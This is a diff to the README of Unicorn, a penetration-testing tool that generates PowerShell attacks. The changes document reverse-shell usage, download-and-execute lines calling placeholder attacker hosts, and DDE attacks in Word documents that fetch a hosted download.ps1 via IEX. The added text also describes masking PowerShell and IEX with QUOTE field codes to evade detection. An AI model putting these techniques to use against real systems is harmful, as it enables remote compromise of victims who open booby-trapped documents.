@@ -64,7 +64,7 @@ Happy Magic Unicorns.
 
 Usage: python unicorn.py payload reverse_ipaddr port <optional hta or macro, crt>
 PS Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443
-PS Down/Exec: python unicorn.py windows/download_exec exe=test.exe url=http://badurl.com/payload.exe
+PS Down/Exec: python unicorn.py windows/download_exec url=http://badurl.com/payload.exe
 Macro Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 macro
 HTA Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 hta
 DDE Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 dde
@@ -76,14 +76,7 @@ Help Menu: python unicorn.py --help
 
 ###                -----POWERSHELL ATTACK INSTRUCTIONS----
 
-Everything is now generated in two files, powershell_attack.txt and unicorn.rc. The text file contains all
-of the code needed in order to inject the powershell attack into memory. Note you will need a place that
-supports remote command injection of some sort. Often times this could be through an excel/word  doc or
-through psexec_commands inside of Metasploit, SQLi, etc.. There are so many implications and  scenarios to
-where you can use this attack at. Simply paste the powershell_attacks.txt command in any command prompt
-window or where you have the ability to call the powershell executable and it will give a shell back to
-you. This attack also supports windows/download_exec for a payload method instead of just Meterpreter
-payloads.
+Everything is now generated in two files, powershell_attack.txt and unicorn.rc. The text file contains  all of the code needed in order to inject the powershell attack into memory. Note you will need a place that supports remote command injection of some sort. Often times this could be through an excel/word  doc or through psexec_commands inside of Metasploit, SQLi, etc.. There are so many implications and  scenarios to where you can use this attack at. Simply paste the powershell_attack.txt command in any command prompt window or where you have the ability to call the powershell executable and it will give a shell back to you. This attack also supports windows/download_exec for a payload method instead of just Meterpreter payloads. When using the download and exec, simply put python unicorn.py windows/download_exec url=https://www.thisisnotarealsite.com/payload.exe and the powershell code will download the payload and execute.
 
 Note that you will need to have a listener enabled in order to capture the attack.
 
@@ -160,9 +153,10 @@ In order to use this attack, run the following examples:
 python unicorn.py <payload> <lhost> <lport> dde
 python unicorn.py windows/meterpreter/reverse_https 192.168.5.5 443 dde
 
-Once generated, a powershell_attacks.txt will be generated which contains the Office code, and the
+Once generated, a powershell_attack.txt will be generated which contains the Office code, and the
 unicorn.rc file which is the listener component which can be called by msfconsole -r unicorn.rc to
-handle the listener for the payload.
+handle the listener for the payload. In addition a download.ps1 will be exported as well (explained
+in the latter section).
 
 In order to apply the payload, as an example (from sensepost article):
 
@@ -174,5 +168,16 @@ In order to apply the payload, as an example (from sensepost article):
 6. Paste in the code from Unicorn
 7. Save the Word document.
 
-Once the office document is opened, you should receive a shell through powershell injection.
+Once the office document is opened, you should receive a shell through powershell injection. Note
+that DDE is limited on char size and we need to use Invoke-Expression (IEX) as the method to download.
+
+The DDE attack will attempt to download download.ps1 which is our powershell injection attack since
+we are limited to size restrictions. You will need to move the download.ps1 to a location that is
+accessible by the victim machine. This means that you need to host the download.ps1 in an Apache2
+directory that it has access to.
+
+You may notice that some of the commands use "{ QUOTE" these are ways of masking specific commands
+which is documented here: http://staaldraad.github.io/2017/10/23/msword-field-codes/. In this case
+we are changing WindowsPowerShell, powershell.exe, and IEX to avoid detection. Also check out the URL
+as it has some great methods for not calling DDE at all.
 
